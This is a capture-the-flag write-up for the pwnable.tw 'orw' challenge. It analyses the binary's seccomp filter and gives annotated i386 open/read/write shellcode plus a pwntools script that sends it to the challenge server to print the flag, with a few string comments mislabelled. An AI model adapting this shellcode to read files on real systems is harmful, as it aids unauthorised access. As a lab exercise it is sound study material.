---
tags:
  - Pwnables
  - BinaryExploitation
  - Seccomp
---
# orw

Read the flag from `/home/orw/flag`.

Only `open` `read` `write` syscall are allowed to use.

`nc chall.pwnable.tw 10001`
## Challenge Overview

32-bit ELF with a stack canary but executable stack. Seccomp filter installed at startup restricts syscalls to only `open`, `read`, and `write`. No shellcode that calls `execve` will work. Goal is to read `/home/orw/flag` using only those three syscalls.

```bash
(base) ➜  orw checksec orw
[*] '/home/at0m/pwnables/orw/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
## Binary Analysis
### `main` Disassembly

```c
pwndbg> disass main

0x08048548 <+0>:    lea    ecx, [esp+0x4]
0x0804854c <+4>:    and    esp, 0xfffffff0
0x0804854f <+7>:    push   DWORD PTR [ecx-0x4]
0x08048552 <+10>:   push   ebp
0x08048553 <+11>:   mov    ebp, esp
0x08048555 <+13>:   push   ecx
0x08048556 <+14>:   sub    esp, 0x4
0x08048559 <+17>:   call   0x80484cb <orw_seccomp>   ; install seccomp filter
0x0804855e <+22>:   sub    esp, 0xc
0x08048561 <+25>:   push   0x80486a0                 ; "Give me your shellcode:"
0x08048566 <+30>:   call   0x8048380 <printf@plt>
0x0804856b <+35>:   add    esp, 0x10
0x0804856e <+38>:   sub    esp, 0x4
0x08048571 <+41>:   push   0xc8                      ; nbytes = 200
0x08048576 <+46>:   push   0x804a060                 ; buf = fixed address
0x0804857b <+51>:   push   0x0                       ; fd = stdin
0x0804857d <+53>:   call   0x8048370 <read@plt>      ; read shellcode in
0x08048582 <+58>:   add    esp, 0x10
0x08048585 <+61>:   mov    eax, 0x804a060
0x0804858a <+66>:   call   eax                       ; jump into shellcode
```

What main does step by step:

1. calls `orw_seccomp()` to install the seccomp filter
2. prints a prompt
3. reads up to 200 bytes from stdin into `0x804a060` (a fixed, known, executable address)
4. calls `0x804a060` directly, jumping into whatever we sent

No overflow needed. It hands execution straight to our input.

```c
pwndbg> disass orw_seccomp
0x080484cb <+0>:    push   ebp
0x080484cc <+1>:    mov    ebp, esp
0x080484d1 <+6>:    sub    esp, 0x7c
0x080484d4 <+9>:    mov    eax, gs:0x14              ; stack canary
0x080484df <+20>:   lea    eax, [ebp-0x7c]           ; local buffer for BPF filter
0x080484e2 <+23>:   mov    ebx, 0x8048640            ; source: filter data in .rodata
0x080484e7 <+28>:   mov    edx, 0x18                 ; 24 dwords = 96 bytes
0x080484f2 <+39>:   rep movs DWORD PTR es:[edi], DWORD PTR ds:[esi]  ; copy filter onto stack
0x080484f4 <+41>:   mov    WORD PTR [ebp-0x84], 0xc  ; sock_fprog.len = 12 instructions
0x08048500 <+53>:   mov    DWORD PTR [ebp-0x80], eax ; sock_fprog.filter = ptr to BPF

; prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
0x08048506 <+59>:   push   0x0
0x08048508 <+61>:   push   0x0
0x0804850a <+63>:   push   0x0
0x0804850c <+65>:   push   0x1
0x0804850e <+67>:   push   0x26                      ; PR_SET_NO_NEW_PRIVS = 38
0x08048510 <+69>:   call   0x80483b0 <prctl@plt>

; prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filter)
0x08048522 <+87>:   push   0x2                       ; SECCOMP_MODE_FILTER
0x08048524 <+89>:   push   0x16                      ; PR_SET_SECCOMP = 22
0x08048526 <+91>:   call   0x80483b0 <prctl@plt>
```

`prctl` (process control) is a Linux system call that allows a running process or thread to manipulate specific operational characteristics, such as setting process names, managing capabilities, controlling child process reaping, and setting resource limits.

Two `prctl` calls:

|call|args|meaning|
|---|---|---|
|first|`PR_SET_NO_NEW_PRIVS=38, 1`|prevents privilege escalation, required before seccomp filter|
|second|`PR_SET_SECCOMP=22, SECCOMP_MODE_FILTER=2, &filter`|installs the BPF filter|

The BPF filter (12 instructions copied from `0x8048640`) whitelists only syscall numbers `5` (open), `3` (read), and `4` (write). Any other syscall kills the process with SIGSYS.
## Vulnerability

There is no traditional vulnerability here. The binary intentionally reads shellcode and runs it. The constraint is the seccomp filter, `execve` (syscall 11) is blocked so a standard shell payload dies immediately.

The only path is: open the flag file, read its contents into a buffer, write it to stdout.
### Shellcode Plan

```c
open("/home/orw/flag", O_RDONLY)   -> fd
read(fd, esp, 100)                 -> flag bytes into stack
write(1, esp, 100)                 -> print to stdout
```

Syscall numbers (i386):

|syscall|number|
|---|---|
|open|5|
|read|3|
|write|4|
### Shellcode Breakdown

```c
; open("/home/orw/flag", O_RDONLY)
xor  eax, eax
push eax                   ; null terminator
push 0x67616c66            ; "flag"
push 0x2f77726f            ; "/orw"
push 0x2f656d6f            ; "/emo"
push 0x682f2f2f            ; "///h"  (pad to dword)
mov  ebx, esp              ; ebx = pointer to "///home/orw/flag\0"
xor  ecx, ecx              ; ecx = 0 (O_RDONLY)
xor  edx, edx              ; edx = 0
mov  al, 0x5               ; sys_open
int  0x80                  ; eax = fd

; read(fd, esp, 100)
mov  ebx, eax              ; ebx = fd
mov  ecx, esp              ; ecx = buffer (reuse stack)
xor  edx, edx
mov  dl, 0x64              ; edx = 100 bytes
mov  al, 0x3               ; sys_read
int  0x80

; write(1, esp, 100)
mov  al, 0x4               ; sys_write
xor  ebx, ebx
mov  bl, 0x1               ; fd = stdout
int  0x80
```
## Exploit

```python
from pwn import *

context.arch = 'i386'
context.os   = 'linux'

p = remote('chall.pwnable.tw', 10001)

shellcode = asm("""
    xor  eax, eax
    push eax
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov  ebx, esp
    xor  ecx, ecx
    xor  edx, edx
    mov  al, 0x5
    int  0x80

    mov  ebx, eax
    mov  ecx, esp
    xor  edx, edx
    mov  dl, 0x64
    mov  al, 0x3
    int  0x80

    mov  al, 0x4
    xor  ebx, ebx
    mov  bl, 0x1
    int  0x80
""")

p.recvuntil(b':')
p.send(shellcode)
p.interactive()
```

---